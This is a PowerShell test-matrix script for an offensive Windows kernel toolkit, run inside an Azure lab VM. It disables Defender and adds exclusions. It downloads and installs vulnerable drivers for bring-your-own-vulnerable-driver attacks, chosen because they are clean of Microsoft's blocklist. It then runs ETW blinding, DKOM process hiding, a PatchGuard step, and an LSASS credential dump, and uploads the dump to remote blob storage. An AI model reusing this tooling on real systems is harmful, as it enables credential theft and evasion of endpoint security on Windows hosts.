# run_kernel_matrix.ps1 — GUEST-side nyx-kernel matrix runner for the Azure
# kernel lab. Run INSIDE the VM (manually, or headless via
# 'az vm run-command invoke' RunPowerShellScript). Not meant for RDP use,
# but runnable manually for debugging.
#
# NOTE (2026-08-16): the HVCI-on verification matrix is ABANDONED — the
# run_hvci_matrix.sh orchestrator was deleted. The shipping BYOVD drivers
# (WDTKernel / Shield) are clean of the MS blocklist, so HVCI posture no
# longer gates anything we ship; this matrix now runs on a plain x64 lab VM.
#
# What it does:
#   1. Downloads nyx-kernel.exe from the lab storage container (read SAS).
#   2. Downloads the vuln driver(s): WDTKernel from its public mirrors (same
#      URLs and SHA256 pins as .github/workflows/windows-byovd-hosted.yml —
#      kept in sync deliberately so CI and lab exercise the same samples);
#      shield.sys (BYOVD default driver, clean) is operator-staged in the lab
#      container (no public mirror is pinned for it).
#   3. Runs the kit matrix: assess / blind-etw / hide / dump-lsass /
#      pg-window (per DRIVER arm), capturing exit codes + output tails.
#   4. Uploads results.json + the full transcript to the container (write SAS).
#
# Verdict semantics (no false greens):
#   - pass           : exit 0
#   - skip           : arm not exercisable (e.g. shield.sys not staged in the
#                      container) — recorded, never counted as pass or fail
#   - expected-gated : pg-window is gated off by kernelsdk-1-1 (placeholder PG
#                      offsets) — exit 5 is the CORRECT current behavior
#   - fail           : anything else; the step did something we did not predict
#
# Params (via 'az vm run-command invoke' --parameters, or manual):
#   -ContainerSasUrl <url>  container URL incl. SAS token, permissions rwl
#   -DriverMode wdt|byovd|both   (default both)
#   -WorkDir <path>        default C:\nyxlab
param(
    [Parameter(Mandatory=$true)][string]$ContainerSasUrl,
    [ValidateSet('wdt','byovd','both')][string]$DriverMode = 'both',
    [string]$WorkDir = 'C:\nyxlab'
)

$ErrorActionPreference = 'Continue'   # never abort the matrix mid-run; collect everything
New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
$transcriptPath = Join-Path $WorkDir 'matrix_transcript.txt'
Start-Transcript -Path $transcriptPath -Force | Out-Null

$results = New-Object System.Collections.ArrayList

# --- container SAS helpers -----------------------------------------------------
# ContainerSasUrl = https://<acct>.blob.core.windows.net/<container>?<sas>
function Get-BlobUrl([string]$name) {
    $q = $ContainerSasUrl.IndexOf('?')
    if ($q -lt 0) { throw "ContainerSasUrl has no SAS query string" }
    return $ContainerSasUrl.Substring(0, $q).TrimEnd('/') + '/' + $name + $ContainerSasUrl.Substring($q)
}
function Send-Blob([string]$name, [string]$localPath, [string]$contentType) {
    $bytes = [IO.File]::ReadAllBytes($localPath)
    Invoke-RestMethod -Method Put -Uri (Get-BlobUrl $name) `
        -Headers @{ 'x-ms-blob-type' = 'BlockBlob' } -Body $bytes -ContentType $contentType | Out-Null
    Write-Host "[+] uploaded $name ($($bytes.Length) bytes)"
}

# --- matrix step runner ---------------------------------------------------------
function Invoke-KitStep([string]$name, [string]$exe, [string[]]$argv, [string]$expect = 'exit0') {
    Write-Host ""
    Write-Host "=== STEP: $name ==="
    Write-Host ("cmd: {0} {1}" -f $exe, ($argv -join ' '))
    $sw = [Diagnostics.Stopwatch]::StartNew()
    # cmd /c echo.| pipes ENTER so pg-window's read_line returns immediately.
    $out = & cmd /c "echo. | `"$exe`" $argv 2>&1"
    $exit = $LASTEXITCODE
    $sw.Stop()
    $out | ForEach-Object { Write-Host $_ }
    $verdict = switch ($expect) {
        'exit0'          { if ($exit -eq 0) { 'pass' } else { 'fail' } }
        'blocked-ok'     { if ($exit -ne 0) { 'expected-block' } else { 'fail' } }
        'gated-off-ok'   { if ($exit -eq 5) { 'expected-gated' } elseif ($exit -eq 0) { 'pass' } else { 'fail' } }
        default          { 'fail' }
    }
    Write-Host ("--> exit={0} verdict={1} elapsed={2}s" -f $exit, $verdict, [math]::Round($sw.Elapsed.TotalSeconds, 1))
    $tail = ($out | Select-Object -Last 12) -join "`n"
    if ($tail.Length -gt 2000) { $tail = $tail.Substring(0, 2000) }
    [void]$results.Add([ordered]@{
        step = $name; argv = ($argv -join ' '); exit_code = $exit
        verdict = $verdict; elapsed_s = [math]::Round($sw.Elapsed.TotalSeconds, 1)
        output_tail = $tail
    })
}

# --- driver fetchers (mirrors + hashes pinned exactly as in CI) -----------------
function Get-WDTKernel([string]$dest) {
    $candidates = @(
        @{ url = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/3a00cd7cb37b2b4bfaa9e7715fdd13d5.bin";
           sha256 = "8B695B1A430336F49335162D8CA4137C2424640E27EE29511472FEA4451462FE" },
        @{ url = "https://github.com/magicsword-io/LOLDrivers/raw/main/drivers/1055e17ed942357c832a7dfd68861e7d.bin";
           sha256 = "0E27BEC347CA0050C455467BD8D774175C503B8AA1AF3411E94966F7DC6B28B7" },
        @{ url = "https://media.githubusercontent.com/media/magicsword-io/LOLDrivers/main/drivers/3a00cd7cb37b2b4bfaa9e7715fdd13d5.bin";
           sha256 = "8B695B1A430336F49335162D8CA4137C2424640E27EE29511472FEA4451462FE" },
        @{ url = "https://media.githubusercontent.com/media/magicsword-io/LOLDrivers/main/drivers/1055e17ed942357c832a7dfd68861e7d.bin";
           sha256 = "0E27BEC347CA0050C455467BD8D774175C503B8AA1AF3411E94966F7DC6B28B7" }
    )
    foreach ($c in $candidates) {
        try {
            Write-Host "[*] WDTKernel: trying $($c.url)"
            Invoke-WebRequest -Uri $c.url -OutFile $dest -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            $fs = [IO.File]::OpenRead($dest); $b = New-Object byte[] 2
            $fs.Read($b, 0, 2) | Out-Null; $fs.Close()
            if (-not ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)) { Write-Host "    not a PE"; continue }
            $h = (Get-FileHash $dest -Algorithm SHA256).Hash
            if ($h -ne $c.sha256) { Write-Host "    SHA256 mismatch ($h)"; continue }
            return $true
        } catch { Write-Host "    failed: $($_.Exception.Message)" }
    }
    return $false
}

# ==============================================================================
try {
    Write-Host "=== nyx kernel matrix (HVCI lab) — $(Get-Date -Format u) UTC ==="
    Write-Host "DriverMode=$DriverMode WorkDir=$WorkDir"

    # ---- 0. fetch nyx-kernel.exe from the lab container ----
    $exe = Join-Path $WorkDir 'nyx-kernel.exe'
    Write-Host "[*] downloading nyx-kernel.exe from lab container"
    Invoke-WebRequest -Uri (Get-BlobUrl 'nyx-kernel.exe') -OutFile $exe -UseBasicParsing -TimeoutSec 120
    Write-Host "[+] nyx-kernel.exe: $((Get-Item $exe).Length) bytes"

    # ---- 1. Defender off (throwaway lab VM) ----
    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $WorkDir -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'nyx-kernel.exe' -Force -ErrorAction SilentlyContinue

    # ---- 2. driverless baseline: runs on ANY Windows, HVCI or not ----
    Invoke-KitStep 'assess-user-baseline' $exe @('assess','--user')

    # ---- 3. WDT arm (clean WHQL phys-mode BYOVD path) ----
    if ($DriverMode -in 'wdt','both') {
        $wdtSys = 'C:\Windows\System32\drivers\WDTKernel.sys'
        if (Get-WDTKernel (Join-Path $WorkDir 'WDTKernel.sys')) {
            Copy-Item (Join-Path $WorkDir 'WDTKernel.sys') $wdtSys -Force
            $w = @('--wdt', $wdtSys, '--wdt-svc', 'NyaWDT')
            Invoke-KitStep 'wdt-assess'        $exe (@('assess') + $w)
            Invoke-KitStep 'wdt-blind-etw'     $exe (@('blind-etw') + $w)
            # hide: spawn a sacrificial notepad, DKOM-hide it, show tasklist delta.
            $np = Start-Process notepad -PassThru
            Invoke-KitStep 'wdt-hide'          $exe (@('hide', "$($np.Id)") + $w)
            $stillThere = [bool](tasklist /fi "PID eq $($np.Id)" /nh | Select-String -Quiet 'notepad')
            Write-Host ("    post-hide tasklist sees notepad pid {0}: {1} (expect False)" -f $np.Id, $stillThere)
            [void]$results.Add([ordered]@{ step='wdt-hide-verify'; argv="tasklist pid $($np.Id)";
                exit_code=-1; verdict=$(if (-not $stillThere) {'pass'} else {'fail'});
                elapsed_s=0; output_tail="tasklist visible=$stillThere" })
            Stop-Process -Id $np.Id -Force -ErrorAction SilentlyContinue
            $lsass = (Get-Process lsass).Id
            Invoke-KitStep 'wdt-dump-lsass'    $exe (@('dump-lsass', "$lsass") + $w)
            $dmp = Get-ChildItem . -Filter 'lsass_*.dmp' -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($dmp) {
                $magic = [Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes($dmp.FullName)[0..3])
                [void]$results.Add([ordered]@{ step='wdt-dump-lsass-verify'; argv='MDMP magic check';
                    exit_code=-1; verdict=$(if ($magic -eq 'MDMP') {'pass'} else {'fail'});
                    elapsed_s=0; output_tail="magic=$magic size=$($dmp.Length)" })
                Move-Item $dmp.FullName (Join-Path $WorkDir $dmp.Name) -Force
            }
            Invoke-KitStep 'wdt-pg-window'     $exe (@('pg-window') + $w) 'gated-off-ok'
        } else {
            [void]$results.Add([ordered]@{ step='wdt-driver-fetch'; argv='LOLDrivers mirrors';
                exit_code=-1; verdict='fail'; elapsed_s=0; output_tail='all WDTKernel mirrors failed' })
        }
    }

    # ---- 4. BYOVD arm (Shield): the default driver is CLEAN (not on the MS
    #         blocklist), so under HVCI+blocklist the load must SUCCEED — that
    #         is the positive evidence the default BYOVD path survives
    #         hardening. shield.sys has no pinned public mirror; the operator
    #         stages it as a blob in the lab container. Absent blob → skip
    #         (recorded, never a false green/red).
    if ($DriverMode -in 'byovd','both') {
        $shieldWork = Join-Path $WorkDir 'shield.sys'
        try {
            Invoke-WebRequest -Uri (Get-BlobUrl 'shield.sys') -OutFile $shieldWork -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            $shieldSys = 'C:\Windows\System32\drivers\shield.sys'
            Copy-Item $shieldWork $shieldSys -Force
            Invoke-KitStep 'byovd-bootstrap-shield' $exe `
                @('bootstrap','--byovd', $shieldSys, 'NyaShield') 'exit0'
        } catch {
            Write-Host "[*] shield.sys not staged in the lab container — byovd arm skipped"
            [void]$results.Add([ordered]@{ step='byovd-driver-stage'; argv='container blob shield.sys';
                exit_code=-1; verdict='skip'; elapsed_s=0; output_tail='shield.sys blob not staged by operator' })
        }
    }
}
finally {
    # ---- 5. evidence upload — happens even when steps above throw ----
    $summary = [ordered]@{
        utc          = (Get-Date).ToUniversalTime().ToString('o')
        driver_mode  = $DriverMode
        os_build     = (Get-CimInstance Win32_OperatingSystem).BuildNumber
        steps        = $results
        n_fail       = @($results | Where-Object { $_.verdict -eq 'fail' }).Count
    }
    $resultsPath = Join-Path $WorkDir 'results.json'
    ($summary | ConvertTo-Json -Depth 5) | Out-File $resultsPath -Encoding utf8
    Stop-Transcript | Out-Null
    foreach ($f in @(@('results.json', $resultsPath, 'application/json'),
                     @('matrix_transcript.txt', $transcriptPath, 'text/plain'))) {
        try { Send-Blob $f[0] $f[1] $f[2] } catch { Write-Host "[!] upload of $($f[0]) failed: $($_.Exception.Message)" }
    }
    $dump = Get-ChildItem $WorkDir -Filter 'lsass_*.dmp' -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($dump) { try { Send-Blob $dump.Name $dump.FullName 'application/octet-stream' } catch {} }
    Write-Host "=== matrix done: n_fail=$($summary.n_fail) ==="
}
